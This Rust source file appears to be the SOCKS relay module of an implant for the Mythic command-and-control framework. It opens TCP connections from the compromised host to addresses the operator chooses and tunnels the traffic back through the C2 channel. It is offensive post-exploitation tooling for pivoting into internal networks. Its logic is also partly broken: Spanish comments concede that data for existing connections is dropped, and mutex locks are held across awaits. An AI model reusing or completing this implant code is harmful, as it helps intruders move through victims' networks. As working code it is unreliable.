use crate::agent::AgentTask;
use crate::mythic_continued;
use base64::{decode, encode};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, SocketAddr, ToSocketAddrs};
use std::sync::{mpsc, Arc, Mutex};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

#[derive(Deserialize, Serialize, Debug, Clone)]
pub struct SocksMsg {
    pub exit: bool,
    pub server_id: u32,
    pub data: String,
}

#[derive(Debug)]
pub struct SocksState {
    // Usa TcpStream completo en lugar de mitades para evitar problemas de lifetime
    pub connections: Arc<Mutex<HashMap<u32, std::net::SocketAddr>>>,
    pub outbound: Arc<Mutex<Vec<SocksMsg>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(Mutex::new(HashMap::new())),
            outbound: Arc::new(Mutex::new(Vec::new())),
        }
    }
}

pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;
    
    let state = Arc::new(SocksState::new());
    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(relay_loop(tx.clone(), rx, state));
    Ok(())
}

async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>, state: Arc<SocksState>) {
    while let Ok(msg) = rx.recv() {
        if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
            if task.command == "socks_data" {
                if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
                    process_messages(&tx, msgs, &state).await;
                }
            }
        }
    }
}

async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksMsg>, state: &Arc<SocksState>) {
    let mut conns = state.connections.lock().unwrap();
    let mut outbound = state.outbound.lock().unwrap();

    for msg in msgs {
        if msg.exit {
            conns.remove(&msg.server_id);
            continue;
        }

        let data = decode(&msg.data).unwrap_or_default();

        // Verificar si ya tenemos una conexión para este server_id
        if conns.contains_key(&msg.server_id) {
            // En una implementación real, aquí enviaríamos datos a una conexión existente
            // Por ahora, simplemente ignoramos ya que no tenemos los streams guardados
            continue;
        } else {
            let addr = parse_socks_address(&data);
            if let Some(addr) = addr {
                if let Ok(stream) = TcpStream::connect(addr).await {
                    // Guardar información de la conexión
                    conns.insert(msg.server_id, addr);
                    
                    // Crear una task para manejar esta conexión
                    let tx_clone = tx.clone();
                    let state_clone = state.clone();
                    let server_id = msg.server_id;
                    let initial_data = data.clone();
                    
                    tokio::spawn(async move {
                        handle_socks_connection(server_id, stream, initial_data, tx_clone, state_clone).await;
                    });
                }
            }
        }
    }

    if !outbound.is_empty() {
        let json = serde_json::to_string(&*outbound).unwrap();
        let _ = tx.send(serde_json::json!({
            "command": "socks_data",
            "parameters": json,
            "id": "socks_outbound"
        }));
        outbound.clear();
    }
}

async fn handle_socks_connection(
    server_id: u32,
    mut stream: TcpStream,
    initial_data: Vec<u8>,
    tx: mpsc::Sender<serde_json::Value>,
    state: Arc<SocksState>,
) {
    // Escribir datos iniciales
    let _ = stream.write_all(&initial_data).await;
    
    let mut buf = [0u8; 4096];
    
    // Bucle de lectura
    loop {
        match stream.read(&mut buf).await {
            Ok(0) => break, // Conexión cerrada
            Ok(n) => {
                let data = encode(&buf[..n]);
                let msg = SocksMsg { exit: false, server_id, data };
                state.outbound.lock().unwrap().push(msg);
            }
            Err(_) => break,
        }
    }
    
    // Notificar cierre de conexión
    state.outbound.lock().unwrap().push(SocksMsg { 
        exit: true, 
        server_id, 
        data: String::new() 
    });
    
    // Remover del estado
    state.connections.lock().unwrap().remove(&server_id);
}

fn parse_socks_address(data: &[u8]) -> Option<SocketAddr> {
    if data.len() < 6 || data[0] != 5 || data[1] != 1 {
        return None;
    }
    let atyp = data[3];
    let mut idx = 4;
    match atyp {
        1 => {
            if data.len() < idx + 6 { return None; }
            let ip = Ipv4Addr::new(data[idx], data[idx+1], data[idx+2], data[idx+3]);
            idx += 4;
            let port = u16::from_be_bytes([data[idx], data[idx+1]]);
            Some(SocketAddr::from((ip, port)))
        }
        3 => {
            let len = data[idx] as usize;
            idx += 1;
            if data.len() < idx + len + 2 { return None; }
            let domain = String::from_utf8_lossy(&data[idx..idx+len]).to_string();
            idx += len;
            let port = u16::from_be_bytes([data[idx], data[idx+1]]);
            (domain.as_str(), port).to_socket_addrs().ok()?.next()
        }
        _ => None,
    }
}
